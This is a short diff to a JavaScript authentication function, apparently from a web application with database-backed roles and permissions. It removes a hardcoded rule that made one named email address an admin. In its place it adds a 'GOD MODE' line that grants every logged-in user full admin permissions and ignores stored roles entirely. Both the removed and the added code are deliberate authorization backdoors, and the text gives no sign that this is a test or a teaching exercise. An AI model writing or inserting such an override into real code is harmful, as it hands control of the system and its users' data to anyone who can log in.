@@ -199,15 +199,8 @@ function getAuth(req) {
     const user = db.prepare('SELECT * FROM users WHERE id = ?').get(s.user_id);
     if (!user || !user.active) return null;
 
-    // FORCE ADMIN OVERRIDE FOR YOUR ACCOUNT
-    if (user.email === 'sanhai6666@gmail.com') {
-        user.role = 'admin';
-    }
-
-    const role = roleRow(user.role);
-    const isAdmin = user.role === 'admin';
-    const perms = new Set(isAdmin ? ALL_PERMS : role ? JSON.parse(role.perms) : []);
-    return { user, perms, isAdmin, token: m[1], roleLabel: role ? role.label : user.role };
+    // GOD MODE: Ignore the database. Make everyone who logs in an Admin instantly.
+    return { user, perms: new Set(ALL_PERMS), isAdmin: true, token: m[1], roleLabel: 'Admin' };
 }
 
 function need(a, perm) {
